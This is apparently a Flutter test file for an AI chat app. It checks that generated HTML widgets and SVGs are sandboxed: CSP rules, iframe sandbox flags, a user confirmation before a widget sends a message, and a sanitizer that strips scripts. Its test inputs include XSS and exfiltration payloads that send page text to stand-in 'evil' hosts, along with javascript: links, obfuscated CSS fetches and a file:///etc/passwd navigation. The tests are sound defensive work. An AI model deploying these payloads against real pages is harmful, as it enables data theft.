import 'dart:convert';

import 'package:every_ai/core/platform/platform_kind.dart';
import 'package:every_ai/core/theme/every_theme.dart';
import 'package:every_ai/features/artifacts/domain/artifact.dart';
import 'package:every_ai/features/artifacts/export/downloads.dart';
import 'package:every_ai/features/artifacts/ui/renderers/sandbox.dart';
import 'package:every_ai/features/artifacts/ui/renderers/svg_view.dart';
import 'package:every_ai/features/artifacts/ui/renderers/web_view.dart';
import 'package:every_ai/features/artifacts/ui/visual_view.dart';
import 'package:every_ai/features/chat/domain/message.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:material_ui/material_ui.dart' as m;

/// The srcdoc attribute of a host page, unescaped.
String _srcdoc(String page) {
  final m = RegExp(r'srcdoc="([^"]*)"').firstMatch(page)!;
  return m[1]!.replaceAll('&quot;', '"').replaceAll('&lt;', '<').replaceAll('&gt;', '>').replaceAll('&amp;', '&');
}

void main() {
  group('CSP', () {
    test('interactive pages run scripts from the CDN allowlist only', () {
      final csp = contentSecurityPolicy(interactive: true);
      expect(csp, startsWith("default-src 'none'"));
      for (final cdn in cdnAllowlist) {
        expect(csp, contains(cdn));
      }
      expect(csp, contains("script-src 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net"));
      expect(csp, contains("form-action 'none'"));
      expect(csp, contains("frame-src 'none'"));
      expect(csp, isNot(contains('*')));
    });

    test('static pages run no script and load nothing remote', () {
      final csp = contentSecurityPolicy(interactive: false);
      expect(csp, contains("script-src 'none'"));
      expect(csp, contains("connect-src 'none'"));
      expect(csp, isNot(contains('https://')));
    });
  });

  group('sandboxedDocument', () {
    final cspMeta = '<!doctype html><meta http-equiv="Content-Security-Policy"';

    test('the policy comes before any of the content', () {
      for (final html in [
        '<html><head lang="x"><title>t</title></head></html>',
        '<!DOCTYPE html><p>hi</p>',
        '<button>x</button>',
        // Markup before the head would otherwise run with no policy.
        "<script>fetch('https://evil/?d='+document.body.innerText)</script><html><head></head></html>",
        // A head inside a comment or a string must not move the policy.
        '<!-- <head> --><script>steal()</script><head></head>',
        "<script>var s='<head>';new Image().src='https://evil/?'+s</script>",
      ]) {
        final doc = sandboxedDocument(html, surface: WebSurface.page, interactive: true);
        expect(doc, startsWith(cspMeta), reason: html);
        expect(doc, endsWith(html), reason: html);
      }
    });

    test('the host page carries a policy for the frame to inherit', () {
      final page = sandboxedHostPage('<p>x</p>', surface: WebSurface.page, interactive: false);
      final head = page.substring(0, page.indexOf('<iframe'));
      expect(head, contains('http-equiv="Content-Security-Policy"'));
      expect(head, contains('default-src'));
      // So the frame can't navigate itself to a remote page (Android doesn't ask the app for subframes).
      expect(head, contains("frame-src 'none'"));
    });

    test('pages that run script lose DNS prefetching and WebRTC before the content', () {
      const html = '<p>content</p>';
      final doc = sandboxedDocument(html, surface: WebSurface.page, interactive: true);
      final at = doc.indexOf(html);
      expect(
        doc.indexOf('x-dns-prefetch-control'),
        allOf(greaterThan(doc.indexOf('Content-Security-Policy')), lessThan(at)),
      );
      expect(doc.indexOf('RTCPeerConnection'), allOf(greaterThan(0), lessThan(at)));
      expect(doc, contains('RTCDataChannel'));
      final static = sandboxedDocument(html, surface: WebSurface.page, interactive: false);
      expect(static, isNot(contains('RTCPeerConnection')));
      expect(static, isNot(contains('x-dns-prefetch-control')));
    });
  });

  group('sandboxedHostPage', () {
    const content = '<!doctype html><html><head></head><body><script>steal()</script>"quoted"</body></html>';

    test('puts the content in an allow-scripts iframe without same-origin', () {
      final page = sandboxedHostPage(content, surface: WebSurface.page, interactive: true, token: 'tok');
      expect(page, contains('sandbox="allow-scripts"'));
      expect(page, isNot(contains('allow-same-origin')));
      expect(page, isNot(contains('allow-top-navigation')));
      expect(page, isNot(contains('allow-popups')));
      // The content is only inside the escaped srcdoc, never live in the host.
      expect(page, isNot(contains('<script>steal()')));
      final doc = _srcdoc(page);
      expect(doc, contains('<script>steal()</script>"quoted"'));
      expect(doc.indexOf('Content-Security-Policy'), lessThan(doc.indexOf('steal()')));
      expect(doc, isNot(contains('tok')), reason: 'the token stays in the host page');
      expect(page, contains('background:#fff'));
    });

    test('static pages get an empty sandbox and a no-script CSP', () {
      final page = sandboxedHostPage(content, surface: WebSurface.page, interactive: false);
      expect(page, contains('sandbox=""'));
      expect(_srcdoc(page), contains("script-src 'none'"));
    });

    test('widgets get the theme, base styles and the send bridge', () {
      final theme = EveryTheme.resolve(DesignLanguage.material, Brightness.dark);
      final page = sandboxedHostPage(
        '<button onclick="everyai.send(\'pick A\')">A</button>',
        surface: WebSurface.widget,
        interactive: true,
        theme: themeCss(theme),
        token: 'tok123',
      );
      final doc = _srcdoc(page);
      expect(doc, contains('--foreground:#'));
      expect(doc, contains('color-scheme:dark'));
      expect(doc, contains('window.everyai='));
      expect(doc, contains('userActivation'));
      expect(page, contains('background:transparent}'));
      expect(page, contains('"tok123"'));
      expect(page, contains(sendHandler));
    });

    test('pages and diagrams get no bridge', () {
      for (final s in [WebSurface.page, WebSurface.diagram]) {
        expect(
          _srcdoc(sandboxedHostPage('<p>x</p>', surface: s, interactive: true)),
          isNot(contains('window.everyai=')),
        );
      }
    });
  });

  testWidgets('a widget\'s message is sent only after the user confirms it', (tester) async {
    final sent = <String>[];
    await tester.pumpWidget(
      m.MaterialApp(
        home: EveryThemeScope(
          theme: EveryTheme.resolve(DesignLanguage.material, Brightness.light),
          child: Builder(
            builder: (context) => GestureDetector(
              onTap: () => sendFromWidget(context, 'Search my chats for bank', sent.add),
              child: const Text('widget'),
            ),
          ),
        ),
      ),
    );
    await tester.tap(find.text('widget'));
    await tester.pumpAndSettle();
    expect(find.textContaining('Search my chats for bank'), findsOneWidget);
    await tester.tap(find.text('Cancel'));
    await tester.pumpAndSettle();
    expect(sent, isEmpty);

    await tester.tap(find.text('widget'));
    await tester.pumpAndSettle();
    await tester.tap(find.text('Send'));
    await tester.pumpAndSettle();
    expect(sent, ['Search my chats for bank']);
  });

  test('handler calls need the host token', () {
    expect(acceptHandlerCall(['tok', 'hi'], 'tok'), 'hi');
    expect(acceptHandlerCall(['hi'], 'tok'), isNull);
    expect(acceptHandlerCall(['other', 'hi'], 'tok'), isNull);
    expect(acceptHandlerCall(['', 'hi'], ''), isNull);
  });

  test('widget messages are trimmed, capped and non-empty', () {
    expect(acceptWidgetMessage('  pick A '), 'pick A');
    expect(acceptWidgetMessage('   '), isNull);
    expect(acceptWidgetMessage(42), isNull);
    expect(acceptWidgetMessage('x' * 5000)!.length, maxWidgetMessage);
  });

  group('navigationPolicy', () {
    test('a clicked link opens in the browser and the frame stays', () async {
      final opened = <Uri>[];
      final policy = await navigationPolicy(
        Uri.parse('https://example.org/a'),
        userClicked: true,
        open: (u) async {
          opened.add(u);
          return null;
        },
      );
      expect(policy, NavigationActionPolicy.CANCEL);
      expect(opened, [Uri.parse('https://example.org/a')]);
    });

    test('script redirects and other schemes are cancelled silently', () async {
      final opened = <Uri>[];
      Future<Object?> open(Uri u) async {
        opened.add(u);
        return null;
      }

      expect(
        await navigationPolicy(Uri.parse('https://evil.example/x'), userClicked: false, open: open),
        NavigationActionPolicy.CANCEL,
      );
      expect(
        await navigationPolicy(Uri.parse('file:///etc/passwd'), userClicked: true, open: open),
        NavigationActionPolicy.CANCEL,
      );
      expect(opened, isEmpty);
    });

    test('srcdoc and blank frames load', () async {
      Future<Object?> open(Uri u) async => null;
      expect(
        await navigationPolicy(Uri.parse('about:srcdoc'), userClicked: false, open: open),
        NavigationActionPolicy.ALLOW,
      );
      expect(
        await navigationPolicy(Uri.parse('about:blank'), userClicked: false, open: open),
        NavigationActionPolicy.ALLOW,
      );
    });
  });

  test('render_widget is an inline widget visual', () {
    final v = Visual.fromPart(
      ToolCallPart(
        toolName: 'render_widget',
        argumentsJson: jsonEncode({'title': 'Tip calculator', 'html': '<input type=range>'}),
        callId: 'w1',
      ),
    )!;
    expect(v.kind, VisualKind.widget);
    expect(v.kind.opensInPanel, isFalse);
    expect(v.title, 'Tip calculator');
    expect(exportOf(v).extension, 'html');
    expect(exportOf(v).text, '<input type=range>');
  });

  test('sanitizeSvg keeps fragment links and drops outside references', () {
    final clean = sanitizeSvg(
      '<svg viewBox="0 0 10 10"><defs><linearGradient id="g"/></defs>'
      '<style>@import url(https://evil.example/a.css); .a{fill:url(#g)} .b{background:url("https://evil.example/t")}</style>'
      '<use href="#shape"/><use xlink:href="data:image/svg+xml;base64,AAA"/>'
      '<image href="data:image/png;base64,AAAA"/><a href="javascript:x()"><rect onmouseover="x()" width="1"/></a>'
      '<script src="https://evil.example/s.js"/></svg>',
    );
    expect(clean, contains('href="#shape"'));
    expect(clean, contains('url(#g)'));
    expect(clean, contains('data:image/png'));
    expect(clean, isNot(contains('evil.example')));
    expect(clean, isNot(contains('javascript:')));
    expect(clean, isNot(contains('svg+xml')));
    expect(clean, isNot(contains('onmouseover')));
    expect(clean, isNot(contains('<script')));
  });

  group('sanitizeSvg on a parsed tree', () {
    const svgOpen =
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">';

    test('drops prefixed scripts, prefixed outside hrefs and animation', () {
      final clean = sanitizeSvg(
        '$svgOpen<svg:script xmlns:svg="http://www.w3.org/2000/svg">steal()</svg:script>'
        '<image x:href="https://evil.example/p.png"/>'
        '<a href="#a"><set attributeName="href" to="javascript:steal()"/>'
        '<animate attributeName="href" values="javascript:steal()"/><text>t</text></a>'
        '<foreignObject><div>x</div></foreignObject></svg>',
      );
      expect(clean, isNot(contains('script')));
      expect(clean, isNot(contains('evil.example')));
      expect(clean, isNot(contains('<set')));
      expect(clean, isNot(contains('<animate')));
      expect(clean, isNot(contains('foreignObject')));
      expect(clean, contains('<text>t</text>'));
    });

    test('drops a doctype whose entity would expand to markup', () {
      final clean = sanitizeSvg(
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY e "&#60;script&#62;steal()&#60;/script&#62;">]>'
        '$svgOpen<text>&e;</text></svg>',
      );
      expect(clean, isNot(contains('DOCTYPE')));
      expect(clean, isNot(contains('ENTITY')));
      expect(clean, isNot(contains('<script')));
    });

    test('refuses CSS that hides a fetch', () {
      final clean = sanitizeSvg(
        '$svgOpen<rect style="background:u\\72l(https://evil.example/a)" width="1"/>'
        '<rect style="fill:image-set(\'https://evil.example/b\' 1x)" width="2"/>'
        '<style>.c{background:image-set("https://evil.example/c" 1x)}</style></svg>',
      );
      expect(clean, isNot(contains('evil.example')));
      expect(clean, contains('width="1"'));
      expect(clean, contains('width="2"'));
    });

    test('keeps fragment uses, gradients and inline PNGs', () {
      final clean = sanitizeSvg(
        '$svgOpen<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>'
        '<rect fill="url(#g)" width="5" height="5"/><use x:href="#g"/>'
        '<image href="data:image/png;base64,AAAA"/></svg>',
      );
      expect(clean, contains('url(#g)'));
      expect(clean, contains('x:href="#g"'));
      expect(clean, contains('<stop'));
      expect(clean, contains('data:image/png;base64,AAAA'));
    });

    test('invalid XML and non-SVG documents give nothing', () {
      expect(sanitizeSvg('<svg><rect></svg>'), '');
      expect(sanitizeSvg('<html><script>x()</script></html>'), '');
    });
  });
}
